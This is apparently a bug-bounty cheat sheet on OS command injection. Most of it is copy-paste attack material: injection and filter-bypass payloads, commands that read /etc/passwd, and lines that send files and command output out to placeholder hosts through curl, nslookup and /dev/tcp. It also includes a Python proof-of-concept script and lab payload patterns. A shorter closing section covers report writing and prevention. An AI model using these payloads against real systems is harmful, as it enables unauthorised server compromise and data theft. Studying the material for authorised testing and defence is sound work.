


# 🎯 Command Injection —   Cheat Sheet


---

## 🗺️ PART 1: WHERE TO FIND COMMAND INJECTION?

### 🎯 Common Locations (Check These First)

```
✅ URL Parameters
   ?ip=, ?host=, ?ping=, ?file=, ?path=, ?cmd=, ?exec=, ?download=
   ?server=, ?address=, ?target=, ?domain=, ?url=

✅ POST Data
   form fields, JSON body, XML input, multipart data

✅ HTTP Headers (Don't Forget These!)
   User-Agent, X-Forwarded-For, Referer, Cookie
   X-Original-URL, X-Rewrite-URL, CF-Connecting-IP

✅ File Uploads
   filename, metadata, EXIF data, file content

✅ API Endpoints
   /api/ping, /api/exec, /api/download, /api/diagnostic
   /cgi-bin/*, /admin/*, /tools/*

✅ Advanced Places
   WebSocket messages, gRPC requests, GraphQL queries
   Admin "rule engines", script editors, backup tools
```

### 🔍 Recon Checklist (Copy This)

```markdown
- [ ] Search JS files for: `system`, `exec`, `shell`, `ping`, `curl`, `passthru`
- [ ] Check API docs for parameters that "run commands" or "test connection"
- [ ] Look for diagnostic pages: ping, traceroute, nslookup, port scan tools
- [ ] Test admin panels with "custom rules", "scripts", "plugins"
- [ ] Review error messages: do they leak shell output or paths?
- [ ] Check for file processing: image resize, PDF convert, video encode
- [ ] Look for "backup", "export", "download" features that use system commands
```

> 💡 **Golden Rule**: If the app does anything with "network", "files", "system info", or "processing" → TEST FOR COMMAND INJECTION!

---

## 🕵️ PART 2: HOW TO DETECT? (Step-by-Step)

### 🔬 Detection Flow (Simple)

```
1️⃣ Find suspicious parameter (ip, host, file, etc.)
   ↓
2️⃣ Test with TIME DELAY payload
   ?param=127.0.0.1;sleep 5
   ↓
3️⃣ Measure response time
   Normal: 200-500ms | Vulnerable: ~5000ms ✅
   ↓
4️⃣ If no delay → Test with OOB CALLBACK
   ?param=127.0.0.1;curl http://YOUR_DOMAIN
   ↓
5️⃣ Check your server (Burp Collaborator / interact.sh)
   Got DNS/HTTP request? → Vulnerable ✅
   ↓
6️⃣ If still nothing → Test with VISIBLE OUTPUT
   ?param=127.0.0.1;id
   ↓
7️⃣ See command output in response? → Vulnerable ✅
```

### ⚡ Quick Test Payloads 

```bash
# 🕐 Time-Based (Blind CI)
;sleep 5
|sleep 5
%0asleep 5
&&sleep 5
||sleep 5

# 🌐 OOB Callbacks (Blind CI)
;curl http://YOUR_DOMAIN
|nslookup YOUR_DOMAIN
%0awget http://YOUR_DOMAIN
$(curl http://YOUR_DOMAIN)
`nslookup YOUR_DOMAIN`

# 👁️ Visible Output (Non-Blind CI)
;id
|whoami
%0auname -a
&&hostname
||pwd

# 🧪 Filter Testing
;id          # Test if ; works
|id          # Test if | works
%0aid        # Test if newline works
`id`         # Test if backticks work
$(id)        # Test if $() works
```

### 📏 How to Measure Time (3 Ways)

```bash
# Method 1: curl + time command
time curl "https://target.com?vuln=127.0.0.1;sleep 5"
# Look for: real    0m5.007s  → Vulnerable!

# Method 2: Burp Suite Repeater
1. Send request → Note time in bottom-left corner
2. Add payload → Resend → Compare times
3. Difference > 4s = Likely vulnerable

# Method 3: Python script
import time, requests
start = time.time()
requests.get("https://target.com?vuln=127.0.0.1;sleep 5")
print(f"Time: {time.time() - start:.2f}s")  # >4.5s = vulnerable
```

> ✅ **Rule of Thumb**: If response time jumps from ~300ms to ~5000ms → You found it! 🎯

---

## 💥 PART 3: EXPLOITATION PAYLOADS 

### 🔗 Command Chaining Operators

```bash
# Unix/Linux - Copy These
;          # Execute next command ALWAYS
&&         # Execute next if previous SUCCEEDED
||         # Execute next if previous FAILED ✅ Best for injection
|          # Pipe: output of first → input of second
%0a        # Newline (URL encoded) ✅ Best bypass technique
%0d%0a     # CRLF newline (Windows-style)
`command`  # Command substitution (backticks)
$(command) # Command substitution (modern, preferred)

# Windows - Copy These
&          # Sequential execution
&&         # Conditional AND
||         # Conditional OR  
|          # Pipe
%0d%0a     # CRLF newline
```

### 📦 Basic Execution Payloads

```bash
# 🔍 Recon Commands
id                    # Show user ID + groups
whoami                # Show current username
uname -a              # Show OS info
hostname              # Show server name
pwd                   # Show current directory
cat /etc/passwd       # Read user list (Linux)
type C:\Windows\win.ini  # Read file (Windows)
ls -la /              # List files (Linux)
dir C:\               # List files (Windows)

# 🎯 With Chaining (Replace IP with target param)
127.0.0.1;id
127.0.0.1|whoami
127.0.0.1%0auname -a
127.0.0.1&&hostname
127.0.0.1||pwd
```

### 🔄 Inside Command Context (When Input Is Quoted)

```bash
# Original: system("ping $user_input")
# Your input goes INSIDE quotes → Need to break out first

# Break single quotes
';id #'
';whoami #'

# Break double quotes  
";id #"
";whoami #"

# Break backticks
`;id #`
`$(whoami) #`

# Then add your command
';id #
";curl http://YOUR_DOMAIN #
`nslookup $(whoami).YOUR_DOMAIN #`
```

> **Pro Tip**: Always end with `#` to comment out the rest of the original command!

---

## 🚀 PART 4: FILTER BYPASSES (The Magic Section)

### 🚫 No Space? Use These:

```bash
${IFS}              # Bash: Internal Field Separator (acts as space)
${IFS:0:1}          # First character of IFS (usually space)
{cat,/etc/passwd}   # Brace expansion: becomes "cat /etc/passwd"
< /etc/passwd       # Input redirection (no space needed)
%09                 # Tab character (URL encoded)
$'cat\x20/etc/passwd'  # ANSI-C quoting (\x20 = space)
```

### 🚫 No Slash (/)? Use These:

```bash
${HOME:0:1}         # First char of $HOME = "/" on Linux
# Example: cat ${HOME:0:1}etc${HOME:0:1}passwd → cat /etc/passwd

/???/??t /???/p??s??  # Wildcards: /bin/cat /etc/passwd

echo . | tr '!-0' '"-1'  # Generate "/" using tr command

${HOME:0:1}usr${HOME:0:1}bin${HOME:0:1}whoami  # Build path dynamically
```

### 🚫 No Special Characters (; | & $ `)? Use These:

```bash
# Instead of ; → Use newline
%0a
%0d%0a
(Literal newline in Burp: Ctrl+J)

# Instead of $() → Use backticks
`id`
`whoami`

# Instead of backticks → Use /dev/tcp (bash built-in)
</dev/tcp/YOUR_DOMAIN/4444

# Instead of | → Use %7c (URL encoded pipe)
%7c

# Instead of & → Use %26 (URL encoded ampersand)
%26
```

### 🚫 No curl/wget? Use These:

```bash
# Python one-liner
python -c "import urllib; urllib.urlopen('http://YOUR_DOMAIN')"
python3 -c "import urllib.request; urllib.request.urlopen('http://YOUR_DOMAIN')"

# Perl one-liner  
perl -e "use LWP::Simple; get('http://YOUR_DOMAIN')"

# Bash /dev/tcp (no external tools needed)
exec 3<>/dev/tcp/YOUR_DOMAIN/80; echo -e "GET /?data=$(whoami) HTTP/1.1\n\n" >&3; cat <&3

# Using bash built-in ping (triggers DNS)
ping -c 1 $(whoami).YOUR_DOMAIN
```

### 🚫 No cat? Read Files With:

```bash
head /etc/passwd
tail /etc/passwd  
more /etc/passwd
less /etc/passwd
xxd /etc/passwd
od -c /etc/passwd
nl /etc/passwd
```

### 🧪 Advanced Bypass Combos (From Real Writeups)

```bash
# Root-Me Style: Newline + curl + data exfil
%0acurl+--data-urlencode+"content@index.php"+http://YOUR_DOMAIN

# WorstFit Bypass: Fullwidth quotes bypass escapeshellarg()
＂ --use-askpass=calc ＂  # Note: U+FF02 quotes, not regular "

# Polyglot Payload: Works in multiple contexts
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

# Base64 + DNS exfil (avoids special chars)
nslookup $(cat /etc/passwd|base64|tr -d '\n').YOUR_DOMAIN

# Hex encoding bypass
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"  # = /etc/passwd
```

---

## 📤 PART 5: DATA EXFILTRATION (Get the Output)

### 🌐 Method 1: HTTP Callback (Easy)

```bash
# Send file content via POST body
curl -X POST -d @/etc/passwd http://YOUR_DOMAIN

# Send command output in URL
curl http://YOUR_DOMAIN/$(whoami)
curl http://YOUR_DOMAIN/$(cat /etc/passwd|head -1)

# URL-encode the data (safer for special chars)
curl --data-urlencode "data@/etc/passwd" http://YOUR_DOMAIN
```

### 🌐 Method 2: DNS Callback (Stealthier)

```bash
# Simple: command output in subdomain
nslookup $(whoami).YOUR_DOMAIN

# Base64 encode (handles any characters)
nslookup $(cat /etc/passwd|base64|tr -d '\n').YOUR_DOMAIN

# Chunk large files (DNS has length limits)
for line in $(cat /etc/passwd); do
  nslookup $(echo $line|base64|head -c 50).YOUR_DOMAIN
done
```

### ⏱️ Method 3: Time-Based Extraction (When OOB Blocked)

```bash
# Extract first character of whoami
if [[ $(whoami|cut -c1) == "p" ]]; then sleep 5; fi

# Binary search style (faster)
if [[ $(whoami|cut -c1) < "m" ]]; then sleep 5; fi

# Extract full string character by character (Python logic)
# Pseudocode:
for position in 1..20:
  for char in "abcdefghijklmnopqrstuvwxyz0123456789":
    payload = f"if [[ $(whoami|cut -c{position}) == '{char}' ]]; then sleep 3; fi"
    if response_time >= 2.5s:
      found_char = char
      break
```

### 📁 Method 4: File Redirection (If Web Directory Writable)

```bash
# Write output to web-accessible file
id > /var/www/html/output.txt
cat /etc/passwd > /var/www/images/pwned.txt

# Then retrieve via browser
GET /output.txt
GET /images/pwned.txt

# Append instead of overwrite (for multiple commands)
id >> /var/www/html/log.txt
hostname >> /var/www/html/log.txt
```

---

## 🧰 PART 6: TOOLS 

### 🔍 Detection & Testing

```bash
# Burp Suite (Professional)
✅ Intercept & modify requests
✅ Repeater for manual testing  
✅ Intruder for automation
✅ Collaborator for OOB detection ← ESSENTIAL

# Commix (Automated CI Scanner)
git clone https://github.com/commixproject/commix
python commix.py -u "https://target.com/vuln.php?ip=*" --batch

# Nuclei (Fast Scanner with Templates)
nuclei -u https://target.com -t http/cves/ -t http/vulnerabilities/
nuclei -u https://target.com -t command-injection.yaml

# curl + time (Quick manual test)
time curl "https://target.com?vuln=test;sleep 5"
```

### 🌐 OOB Servers (For Blind CI)

```bash
# Burp Collaborator (Best, but needs Pro)
✅ Built into Burp Suite Professional
✅ Auto-generates unique domains
✅ Logs DNS, HTTP, SMTP, interactions

# interact.sh (Free Alternative)
✅ Public API: https://api.interact.sh
✅ Register domain: GET /register
✅ Poll interactions: GET /interactions?id=DOMAIN_ID

# dnsbin.zhack.ca (Simple DNS-only)
✅ Go to http://dnsbin.zhack.ca
✅ Get your subdomain
✅ Watch for incoming DNS queries

# pingb.in (Another free option)
✅ Similar to dnsbin
✅ Simple web interface
```

### 🐍 Automation Scripts (Save These)

```python
# quick_ci_test.py - Time-based detection
import requests, time
def test_ci(url, param, payload):
    start = time.time()
    requests.get(f"{url}?{param}={payload}")
    return time.time() - start

# Usage:
normal = test_ci("https://target.com", "ip", "127.0.0.1")
injected = test_ci("https://target.com", "ip", "127.0.0.1;sleep 5")
print(f"Vulnerable: {injected - normal > 4}")  # True = likely vulnerable
```

```bash
# oob_test.sh - DNS exfil test
#!/bin/bash
DOMAIN="abc123.interact.sh"
curl "https://target.com?vuln=127.0.0.1;nslookup\`whoami\`.$DOMAIN"
echo "Check interact.sh for: whoami_output.abc123.interact.sh"
```

---

## 🎯 PART 7: REAL-WORLD IDEAS (From Labs & Writeups)

### 💡 PortSwigger Lab Patterns
```markdown
## Lab: Simple Case
- Parameter: storeId
- Payload: `1|whoami`
- Key: Pipe operator works, output visible in response

## Lab: Blind with Time Delays  
- Parameter: email
- Payload: `x||ping+-c+10+127.0.0.1||`
- Key: Use || when original command fails, measure 10s delay

## Lab: Blind with Output Redirection
- Parameter: email  
- Payload: `||whoami>/var/www/images/out.txt||`
- Key: Redirect to web-accessible folder, then GET the file

## Lab: Blind with OOB Interaction
- Parameter: email
- Payload: `||nslookup+x.BURP_COLLAB_DOMAIN||`
- Key: DNS query proves execution, no output needed

## Lab: Blind with OOB Data Exfiltration
- Parameter: email
- Payload: `||nslookup+`whoami`.BURP_COLLAB_DOMAIN||`
- Key: Command output IN the DNS subdomain = data exfil!
```

### 💡 Root-Me Challenge Patterns
```markdown
## Challenge: Filter Bypass
- Filter blocks: ; | && || 
- Bypass found: %0a (newline) works!
- Exfil method: curl --data-urlencode "content@file" http://attacker
- Hidden file: .passwd (not index.php)

## Key Lessons:
✅ When ; fails → try %0a (newline)
✅ When output not visible → use OOB exfil  
✅ When curl blocked → try --data-urlencode for safe transmission
✅ Hidden files often start with dot: .passwd, .env, .git/config
```

### 💡 HackerOne / Bug Bounty Writeup Ideas 

```markdown
## Idea 1: CI in "OTP Generation" Feature
- App runs: ping $phone_number to "verify connectivity"
- Payload: phone=123456;curl -d "$(whoami)" http://attacker
- Lesson: Even "harmless" features can hide CI

## Idea 2: Argument Injection via WorstFit
- Filter: escapeshellarg() blocks quotes
- Bypass: Use fullwidth quotes ＂ (U+FF02) instead of "
- Payload: ＂ --use-askpass=calc ＂
- Lesson: Unicode normalization can bypass string filters

## Idea 3: WebSocket Command Injection
- App sends user input via WebSocket to backend
- Backend executes: system("diagnostic " + message)
- Payload: {"msg": "test; id"}
- Lesson: Test WebSocket/gRPC, not just HTTP!

## Idea 4: CI via Image Metadata
- App processes uploaded images with: convert $filename output.jpg
- Payload: filename="test.jpg; id; "
- Lesson: File metadata (name, EXIF) can be injection points

## Idea 5: Async CI + Race Condition
- Command runs in background: system("process $file &")
- Attacker: Upload malicious file, trigger processing, race to read output
- Lesson: Async execution doesn't prevent exploitation!
```

---

## 📝 PART 8: PROOF OF CONCEPT (PoC) Template

### 🎯 Bug Bounty Report Structure (Copy This)

```markdown
# Command Injection in [Endpoint] via [Parameter]

## 📋 Summary
The application executes user-supplied input in a shell command without proper sanitization, allowing arbitrary command execution.

## 🎯 Impact
- [ ] Arbitrary command execution as web server user
- [ ] Full server compromise potential  
- [ ] Data exfiltration (credentials, configs, source code)
- [ ] Lateral movement within internal network
- [ ] Compliance violation (PCI-DSS, GDPR, etc.)

## 🔬 Proof of Concept

### Step 1: Confirm Injection (Time-Based)
```http
POST /feedback/submit HTTP/1.1
...
email=test||sleep+5||
```
**Result**: Response time: 5.2s (normal: 0.3s) ✅

### Step 2: Exfiltrate Data (OOB DNS)

```http  
POST /feedback/submit HTTP/1.1
...
email=test||nslookup+$(whoami).abc123.oastify.com||
```
**Result**: Burp Collaborator received: `peter.abc123.oastify.com`
→ `whoami` output = `peter` ✅

### Step 3: Extract Sensitive File

```http
POST /feedback/submit HTTP/1.1  
...
email=test||curl+-X+POST+-d+@/etc/passwd+http://abc123.oastify.com||
```
**Result**: Received `/etc/passwd` content via HTTP POST ✅

## 🛡️ Recommended Fix
1. Remove shell command execution; use native APIs
   - Python: `subprocess.run([...], shell=False)`
   - PHP: Use native mail() instead of shell_exec()
2. Implement strict input validation (allowlist only)
3. Run application with least privilege (no DNS/HTTP outbound)
4. Apply egress filtering at network level
5. Monitor logs for suspicious patterns (`sleep`, `curl`, `nslookup`)

## 🔗 References
- HackTricks: https://hacktricks.wiki/en/pentesting-web/command-injection.html
- Payloads All The Things: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- file:///E:/Bug%20Bounty/4-Input%20Injection/8.OS%20COMMAND%20INJECTION/command_injection_cheatsheet.html

```

### 🐍 Quick PoC Script (Python)
```python
#!/usr/bin/env python3
"""Command Injection PoC - Time + OOB Detection"""
import requests, time, urllib.parse

TARGET = "https://target.com/endpoint"
PARAM = "ip"
COLLAB = "abc123.oastify.com"  # From Burp Collaborator

def test_time_injection():
    """Test with time delay"""
    payload = "127.0.0.1;sleep 5"
    start = time.time()
    requests.get(f"{TARGET}?{PARAM}={payload}")
    elapsed = time.time() - start
    return elapsed > 4.5  # Vulnerable if delay > 4.5s

def test_oob_injection(command="whoami"):
    """Test with DNS callback"""
    payload = f"127.0.0.1;nslookup `$({command})`.{COLLAB}"
    requests.get(f"{TARGET}?{PARAM}={payload}")
    print(f"[*] Check Collaborator for: {command}.{COLLAB}")

if __name__ == "__main__":
    print("[🎯] Command Injection PoC")
    
    if test_time_injection():
        print("✅ VULNERABLE: Time-based injection confirmed")
        test_oob_injection("whoami")
        test_oob_injection("id")
    else:
        print("❌ No injection detected (or filtered)")
```

---

## 🛡️ PART 9: PREVENTION CHECKLIST (For Developers)

### ✅ Secure Code Patterns

```python
# Python: SAFE way to run commands
import subprocess
# ❌ DANGEROUS: shell=True + string concatenation
# subprocess.run(f"ping {user_input}", shell=True)

# ✅ SAFE: list arguments + shell=False  
subprocess.run(["ping", "-c", "4", user_input], shell=False)

# ✅ BEST: Avoid shell commands entirely
import socket
def ping_host(ip):
    try:
        socket.create_connection((ip, 80), timeout=2)
        return True
    except:
        return False
```

```php
// PHP: SAFE way
$ip = $_GET['ip'];
// ❌ DANGEROUS: Direct concatenation
// system("ping -c 4 " . $ip);

// ✅ Better: escapeshellarg() + validation
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    die("Invalid IP");
}
exec("ping -c 4 " . escapeshellarg($ip));

// ✅ BEST: Use native PHP (no shell)
// Use fsockopen() or socket functions instead
```

### 🔐 Defense in Depth (Copy This Checklist)

```markdown
## Input Validation
- [ ] Use allowlist (not blocklist): only accept expected values
- [ ] Validate type: numeric IDs, IP regex, enum lists
- [ ] Reject special characters: ; | & $ ` ( ) < > \n \r

## Code Practices  
- [ ] Never concatenate user input into shell commands
- [ ] Use native APIs instead of system() calls
- [ ] If shell required: use execFile/subprocess with array args
- [ ] Set shell=False in Python, avoid exec() in Node.js

## Infrastructure
- [ ] Run web app with least privilege (www-data, not root)
- [ ] Block outbound DNS/HTTP from web user at firewall level
- [ ] Disable dangerous PHP functions: exec, system, passthru, shell_exec
- [ ] Use containers with read-only filesystem where possible

## Monitoring
- [ ] Log all command executions with user context
- [ ] Alert on suspicious patterns: sleep, curl, nslookup in params
- [ ] Monitor outbound DNS for base64/hex subdomains
- [ ] WAF rules: block %0a, %0d, curl, wget in query params
```

---

## 🧭 PART 10: QUICK REFERENCE CARD (Save This!)

```bash
# 🔍 DETECTION (Copy-Paste These)
?ip=127.0.0.1;sleep 5          # Time-based test
?ip=127.0.0.1;curl http://YOUR_DOMAIN  # OOB test  
?ip=127.0.0.1;id               # Visible output test

# 💥 EXPLOITATION (Copy-Paste These)
;id | id && id || id %0aid `id` $(id)

# 📤 EXFILTRATION (Copy-Paste These)
# HTTP:
curl -X POST -d @/etc/passwd http://YOUR_DOMAIN
curl http://YOUR_DOMAIN/$(whoami)

# DNS:  
nslookup $(whoami).YOUR_DOMAIN
nslookup $(cat /etc/passwd|base64|tr -d '\n').YOUR_DOMAIN

# 🚫 BYPASSES (Copy-Paste These)
# No space: ${IFS} {cat,/etc/passwd} %09
# No slash: ${HOME:0:1} /???/??t  
# No ;: %0a && ||
# No $: `command` /dev/tcp
# No curl: wget python -c perl -e

# 🛡️ PREVENTION (Copy-Paste These)
# Python: subprocess.run([...], shell=False)
# PHP: escapeshellarg() + filter_var()
# Node: execFile() not exec()
# Always: validate → sanitize → use native APIs
```

---

> [!NOTE] Final Tip
> Command Injection is "old school" but still #7 in OWASP Top 10.  
> Don't skip it because it's "simple" — simple bugs pay the most in bug bounties! 💰
